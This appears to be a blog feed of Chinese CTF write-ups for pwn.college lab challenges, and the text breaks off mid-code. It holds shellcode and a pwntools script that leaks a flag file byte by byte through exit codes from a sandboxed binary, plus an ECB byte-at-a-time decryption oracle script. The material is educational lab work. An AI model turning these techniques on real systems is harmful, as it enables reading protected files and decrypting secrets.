write(1, buffer, rax)    lea rsi, [rel errormessage]    mov rdi, 1                        ; stdout    mov rdx, rax                      ; 读取的字节数    mov rax, 1                        ; SYS_write    syscall    ; exit(1)    mov rdi, 1                        ; 返回码 1    mov rax, 60                       ; SYS_exit    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><h3 id="系统调用参数"><a href="#系统调用参数" class="headerlink" title="系统调用参数"></a>系统调用参数</h3><p><code>linkat</code>的函数原型是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">linkat</span><span class="token punctuation">(</span><span class="token keyword">int</span> olddirfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>oldpath<span class="token punctuation">,</span> <span class="token keyword">int</span> newdirfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>newpath<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>olddirfd</code>: 指向旧目录文件描述符（可以是<code>AT_FDCWD</code>，表示当前工作目录）。</li><li><code>oldpath</code>: 指向要链接的源路径的指针。</li><li><code>newdirfd</code>: 指向新目录文件描述符（可以是<code>AT_FDCWD</code>，表示当前工作目录）。</li><li><code>newpath</code>: 指向目标路径的指针。</li><li><code>flags</code>: 链接时的标志。</li></ul><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p><code>fchdir</code>是一个系统调用，用于更改当前工作目录到由文件描述符指定的目录。与<code>chdir</code>不同，<code>fchdir</code>是通过一个打开的文件描述符进行操作，而不直接使用路径名。</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fchdir</span><span class="token punctuation">(</span><span class="token keyword">int</span> dirfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li><code>dirfd</code>: 指向要设置为当前工作目录的目录的文件描述符。这个文件描述符必须是一个有效的目录。如果使用<code>AT_FDCWD</code>作为参数，则表示使用当前工作目录。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><ul><li>如果成功，返回<code>0</code>。</li><li>如果失败，返回<code>-1</code>，并将<code>errno</code>设置为表示错误的代码。</li></ul><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>有些人白痴到把<code>lea rdi, [rel filename]</code> 写成了 <code>mov rdi, [rel filename]</code></p><h3 id="1-lea-rdi-rel-dirname"><a href="#1-lea-rdi-rel-dirname" class="headerlink" title="1. lea rdi, [rel dirname]"></a>1. <code>lea rdi, [rel dirname]</code></h3><ul><li><strong>功能</strong>：<code>lea</code>（Load Effective Address）指令用于加载一个地址（而不是指向该地址的内容）到寄存器中。具体来说，它计算 <code>dirname</code> 的地址，并将这个地址存储到 <code>rdi</code> 中。</li><li><strong>用途</strong>：当你需要将一个变量或字符串的地址传递给系统调用或其他指令时，<code>lea</code> 是正确的选择。它不会尝试去访问或读取 <code>dirname</code> 变量的内容，而是将它的地址直接放到 <code>rdi</code> 中。</li></ul><h3 id="2-mov-rdi-rel-dirname"><a href="#2-mov-rdi-rel-dirname" class="headerlink" title="2. mov rdi, [rel dirname]"></a>2. <code>mov rdi, [rel dirname]</code></h3><ul><li><strong>功能</strong>：<code>mov</code> 指令用于将某个内存地址中的内容加载到寄存器中。在这种情况下，<code>[rel dirname]</code> 被解释为从 <code>dirname</code> 的内存地址读取内容，并将这个内容放入 <code>rdi</code> 中。</li><li><strong>用途</strong>：这种用法会尝试访问 <code>dirname</code> 所指向的内存位置，并将该位置的内容（通常是字符串的首字符的 ASCII 值）放入 <code>rdi</code> 中。这通常不是我们想要的，因为在创建目录时，我们需要传递的是目录的地址，而不是其内容。</li></ul><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><code>/challenge/babyjail_level8  &lt; shellcode.bin 3&lt;/</code></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>又犯了第7关的错误</p><p>要注意下x86-64和x86-32两种架构下，系统调用号是不一样的。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">32位：mov eax, 3    ---(read)int 0x8064位：mov rax, 3   -----(close)syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>学习一下这种编程思路。替换掉TEST的占位，换成响应的地址，然后再汇编。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/babyjail_level10"</span><span class="token punctuation">,</span> <span class="token string">"/flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">"""        mov rdi, 3        mov rsi, 0x1337100        mov rdx, 100        mov rax, 0        syscall        mov rax, 0x3c        mov rdi, [TEST]        syscall"""</span>    <span class="token comment"># 替换占位符</span>    shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TEST"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x1337100</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>returncode<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-6-Writeup</title>
      <link href="/2024/09/14/pwn-college-web-6-writeup/"/>
      <url>/2024/09/14/pwn-college-web-6-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/cryptography/">https://pwn.college/intro-to-cybersecurity/cryptography/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-python-中int、hex、byte之间的转换"><a href="#1-python-中int、hex、byte之间的转换" class="headerlink" title="1. python 中int、hex、byte之间的转换"></a>1. python 中int、hex、byte之间的转换</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">3735928559</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment"># 3735928559</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0xdeadbeef   int->转十六进制字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># b'\xde\xad\xbe\xef' 十六进制字符串转 bytes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># b'deadbeef' 十六进制ASCII码字符串 转 bytes</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"deadbeef"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3735928559 十六进制字符串转 int</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"deadbeef"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3735928559 十六进制字符串转 int</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>a<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3735928559 字节  转 int</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># b'\xde\xad\xbe\xef'  int 转 字节数据</span><span class="token comment"># 关于十六进制转字符串的问题</span><span class="token string">b'\xde\xad'</span>  <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span> <span class="token string">b'ab'</span>在形式上是一样的，只不过它通过ASCII码解码了一下，以后见到<span class="token string">b''</span><span class="token punctuation">,</span>里面不带\x的字母一律当将其转换成字母的ASCII码表示。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240917122217.png" alt="20240917122217"></p><h3 id="2-pwntool的用法"><a href="#2-pwntool的用法" class="headerlink" title="2. pwntool的用法"></a>2. pwntool的用法</h3><p><code>context.log_level = debug</code>，这个可以显示与进程交互的所有信息，全部输入输出的回显。</p><h3 id="3-Base64-编码原理"><a href="#3-Base64-编码原理" class="headerlink" title="3. Base64 编码原理"></a>3. Base64 编码原理</h3><p><a href="https://juejin.cn/post/6994612829437296647">https://juejin.cn/post/6994612829437296647</a></p><h3 id="4-AES加密"><a href="#4-AES加密" class="headerlink" title="4. AES加密"></a>4. AES加密</h3><p>AES（高级加密标准，Advanced Encryption Standard） 是一种对称加密算法。在对称加密中，加密和解密使用相同的密钥。发送方使用密钥将明文加密为密文，接收方则使用相同的密钥将密文解密回明文。因为密钥必须在加密和解密双方之间安全共享，所以对称加密要求双方拥有相同的密钥。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240916172338.png" alt="20240916172338"></p><h3 id="5-大小端序"><a href="#5-大小端序" class="headerlink" title="5. 大小端序"></a>5. 大小端序</h3><p>大端序 (Big-Endian): 高位字节存储在内存的低地址处，低位字节存储在高地址处。即从左到右按值大小排列，像我们日常阅读的方式。<br>小端序 (Little-Endian): 低位字节存储在内存的低地址处，高位字节存储在高地址处。即从右到左按值大小排列。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token string">b'\x12\x34'</span>num_big <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num_big<span class="token punctuation">)</span>  <span class="token comment"># 输出: 4660 (即 0x1234)</span>num_big <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment"># 默认大端序</span><span class="token keyword">print</span><span class="token punctuation">(</span>num_big<span class="token punctuation">)</span>  <span class="token comment"># 输出: 4660 (即 0x1234)</span><span class="token comment"># 使用小端序</span>num_little <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num_little<span class="token punctuation">)</span>  <span class="token comment"># 输出: 13330 (即 0x3412)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-python中-的含义"><a href="#6-python中-的含义" class="headerlink" title="6. python中==的含义"></a>6. python中==的含义</h3><p>在 Python 中，<code>==</code> 是一个比较运算符，用于检查两个对象是否相等。它比较的是对象的值或内容，而不是对象的身份（即内存地址）。具体来说：</p><h4 id="对于基本数据类型"><a href="#对于基本数据类型" class="headerlink" title="对于基本数据类型"></a>对于基本数据类型</h4><ul><li><strong>数值类型（如整数、浮点数）</strong>：<code>==</code> 比较两个数值是否相等。例如，<code>5 == 5.0</code> 会返回 <code>True</code>，因为它们表示相同的数值。</li><li><strong>字符串和字节串</strong>：<code>==</code> 比较两个字符串或字节串的内容是否相同。注意，字符串和字节串是不同的类型，因此 <code>b&#39;abc&#39; == &#39;abc&#39;</code> 会返回 <code>False</code>，因为一个是字节串，另一个是字符串。要比较它们，你需要将其中一个转换成另一个类型。  <strong>尤其注意这个</strong></li></ul><h4 id="对于复杂数据类型"><a href="#对于复杂数据类型" class="headerlink" title="对于复杂数据类型"></a>对于复杂数据类型</h4><ul><li><strong>列表、元组、集合、字典</strong>：<code>==</code> 比较两个数据结构的内容是否相同。例如，<code>[1, 2, 3] == [1, 2, 3]</code> 会返回 <code>True</code>，而 <code>&#123;&#39;a&#39;: 1&#125; == &#123;&#39;b&#39;: 1&#125;</code> 会返回 <code>False</code>。</li></ul><h4 id="对于对象"><a href="#对于对象" class="headerlink" title="对于对象"></a>对于对象</h4><ul><li><strong>自定义对象</strong>：<code>==</code> 比较两个对象的值是否相等，而不是它们是否是同一个对象。默认情况下，Python 会比较对象的 <code>id</code>（即内存地址），但可以通过定义类的 <code>__eq__</code> 方法来定制相等性比较。</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><h5 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">10</span>y <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">print</span><span class="token punctuation">(</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span>  <span class="token comment"># 输出: True</span>a <span class="token operator">=</span> <span class="token string">"hello"</span>b <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span>  <span class="token comment"># 输出: True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="自定义对象"><a href="#自定义对象" class="headerlink" title="自定义对象"></a>自定义对象</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>other<span class="token punctuation">,</span> Person<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name        <span class="token keyword">return</span> <span class="token boolean">False</span>person1 <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">)</span>person2 <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>person1 <span class="token operator">==</span> person2<span class="token punctuation">)</span>  <span class="token comment"># 输出: True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1 <span class="token operator">==</span> list2<span class="token punctuation">)</span>  <span class="token comment"># 输出: True</span>dict1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token string">'value'</span><span class="token punctuation">&#125;</span>dict2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token string">'value'</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict1 <span class="token operator">==</span> dict2<span class="token punctuation">)</span>  <span class="token comment"># 输出: True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>==</code> 用于检查两个对象的值或内容是否相等，具体的比较逻辑可能会根据数据类型和自定义类的实现有所不同。</p><h3 id="7-diffie-Hallman"><a href="#7-diffie-Hallman" class="headerlink" title="7. diffie-Hallman"></a>7. diffie-Hallman</h3><p>diffie-Hallman</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240923110157.png" alt="diffie-Hallman"></p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>通过flag文件的大小可以知道flag文件的长度是57。</p><p>解题思路就是：<br>1:<br>    63* A + p<br>    63* A + 猜测字母  —- 这里只需要对比结果的前64个字节是否相等，就知道猜得到底对不对了。<br>2:<br>    62* A + pw<br>    62* A + p + 猜测字母</p><pre><code>....</code></pre><p>57:<br>    7 * A + {flag}<br>    7 * A + {flag - 1} + 猜测字母（最后的<code>&#125;</code>） </p><p>这样就能把flag的所有内容都解出来了。</p><p>​    </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn<span class="token keyword">import</span> base64 chall<span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/challenge/run"</span><span class="token punctuation">)</span> chall<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">b"secret ciphertext (b64): "</span><span class="token punctuation">)</span> secret_ciphertext<span class="token operator">=</span> chall<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> ciphertext_decoded<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret_ciphertext<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">findNextChar</span><span class="token punctuation">(</span>currFlag<span class="token punctuation">,</span> numA<span class="token punctuation">)</span><span class="token punctuation">:</span>     chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span>numA<span class="token punctuation">)</span><span class="token punctuation">)</span>     chall<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"ciphertext (b64): "</span><span class="token punctuation">)</span>     new_line<span class="token operator">=</span>chall<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>    new_encryption<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>new_line<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_encryption<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         chall<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span>numA<span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>currFlag<span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         chall<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"ciphertext (b64): "</span><span class="token punctuation">)</span>         line<span class="token operator">=</span>chall<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        encryption<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>line<span class="token punctuation">)</span>         <span class="token keyword">if</span> new_encryption<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">==</span> encryption<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag  <span class="token operator">=</span> flag <span class="token operator">+</span> findNextChar<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>我把这一关的代码抽出来了，在解题的过程中，第一开始总是无法正确处理输入输出。</p><ul><li>B 接受的是 <code>int的十六进制字符串</code>(也就是字符串对应的ASCII码表示—字节流)</li><li>然后通过<code>int(name, 16)</code>将十六进制字符串转换为int类型。</li></ul><p>所以你传输的也要是<code>十六进制字符串对应的字节流</code></p><p>详情你可以看一下，问题1的讲解，总之一开始直接传输int类型所对应的字节表示，是错误的<code>譬如直接传输b&#39;\xde\xad\xbe\xef&#39;</code> ，B会按照字符串的形式对字节流进行解码，<code>\xde</code>这种字节按照<code>ASCII码</code>解码的话肯定是无法对应到正确的十六进制字母。所以会报错</p><p>``</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> string<span class="token keyword">import</span> random<span class="token keyword">import</span> pathlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> textwrap<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash<span class="token punctuation">.</span>SHA256 <span class="token keyword">import</span> SHA256Hash<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random<span class="token punctuation">.</span>random <span class="token keyword">import</span> getrandbits<span class="token punctuation">,</span> randrange<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpadflag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/Web6/level6/flag"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># config = (pathlib.Path(__file__).parent / ".config").read_text()</span>level <span class="token operator">=</span> <span class="token number">6</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> b64<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_b64</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> (b64)"</span></span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_hex_block</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> byte_block_size<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value_to_show <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> byte_block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        value_to_show <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>byte_block_size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        value_to_show 